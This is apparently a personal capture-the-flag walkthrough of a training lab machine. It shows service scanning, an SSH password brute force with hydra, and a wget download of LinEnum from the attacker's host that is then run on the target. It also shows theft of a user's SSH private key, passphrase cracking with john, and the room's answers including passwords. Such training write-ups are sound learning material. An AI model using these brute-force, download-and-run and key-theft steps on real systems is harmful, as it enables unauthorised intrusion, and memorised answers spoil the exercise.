# Basic Pentesting
- brute forcing 
- hash cracking 
- service enumeration
- Linux Enumeration

Deploy the machine and connect to our network

Find the services exposed by the machine
Command : `nmap -sV 10.10.118.181`

![Pasted image 20251001112217.png](thm_pics/Pasted%20image%2020251001112217.png)

What is the name of the hidden directory on the web server(enter name without /)?
Command : `gobuster dir -u http://10.10.118.181 -w /usr/share/wordlists/dirb/common.txt`

![Pasted image 20251001112610.png](thm_pics/Pasted%20image%2020251001112610.png)

- hidden directory = development

User brute-forcing to find the username & password
- now, lets focus on port SMB to find SMB usernames
- Command : `enum4linux 10.10.118.181`

![Pasted image 20251001130126.png](thm_pics/Pasted%20image%2020251001130126.png)

- Users list = kay,jan,ubuntu (probably not)
- hydra can only be used for smbv1
- since **port 22** is also open, maybe we can use hydra for that
- Command : `hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.118.181 ssh`

What is the username?
jan

What is the password?
armando

What service do you use to access the server(answer in abbreviation in all caps)?
SSH

Enumerate the machine to find any vectors for privilege escalation
- find binaries with SUID bit set
- Command :  `find / -type f -perm -04000 -ls 2>/dev/null`

![Pasted image 20251001141751.png](thm_pics/Pasted%20image%2020251001141751.png)

- sudo can be helpful, lets try using sudo to cat /etc/shadow file

![Pasted image 20251001141908.png](thm_pics/Pasted%20image%2020251001141908.png)

- cannot, lets see which commands jan can run with sudo (`sudo -l`)

![Pasted image 20251001142134.png](thm_pics/Pasted%20image%2020251001142134.png)

- jan cannot run anything with sudo!
- Hint says : Use **LinEnum** for privexec checklist
- Cloned LinEnum

![Pasted image 20251001142529.png](thm_pics/Pasted%20image%2020251001142529.png)

- host a file by using `python3 -m http.server 80`
- on target : `wget http://10.23.125.244:80/LinEnum.sh`

![Pasted image 20251001143018.png](thm_pics/Pasted%20image%2020251001143018.png)

- permission denied again
- this command worked : `wget -O /tmp/LinEnum.sh http://10.23.125.244:80/LinEnum.sh`
- go to /tmp dir and changed permission : `chmod +x LinEnum.sh`
- executed `./LinEnum.sh`

![Pasted image 20251001144044.png](thm_pics/Pasted%20image%2020251001144044.png)

- try listing files in /home/kay directory

What is the name of the other user you found(all lower case)?
kay

If you have found another user, what can you do with this information?
- try ls -la to see we can access which files in kay's directory

![Pasted image 20251001144432.png](thm_pics/Pasted%20image%2020251001144432.png)

- in `/home/kay/.ssh/authorized_key`, there is a ssh-rsa file here, but this is the public key. we should try to find private key
- This tells you algorithm, bit-size and fingerprint : Command : `ssh-keygen -lf /home/kay/.ssh/authorized_keys`

![Pasted image 20251001150251.png](thm_pics/Pasted%20image%2020251001150251.png)

- This is the path to private key : `cat /home/kay/.ssh/id_rsa`  because it begins with "BEGIN RSA PRIVATE KEY"
- still cannot login because i dont have a passphrase

![Pasted image 20251001151002.png](thm_pics/Pasted%20image%2020251001151002.png)

**Use John to brute the passphase**
1. Extract crackable blob : `python3 /usr/share/john/ssh2john.py key_privatekey > key.hash` 
2. run john with a wordlist : `john --wordlist=/usr/share/wordlists/rockyou.txt key.hash`

![Pasted image 20251001152355.png](thm_pics/Pasted%20image%2020251001152355.png)

- Passphase = beeswax
- try logging in again using ssh and the actual **private key** (not the crackable blob)

![Pasted image 20251001152803.png](thm_pics/Pasted%20image%2020251001152803.png)

- woohoo! can login now!
- now, lets find the actual pass in plaintext

![Pasted image 20251001152842.png](thm_pics/Pasted%20image%2020251001152842.png)

What is the final password you obtain?
heresareallystrongpasswordthatfollowsthepasswordpolicy$$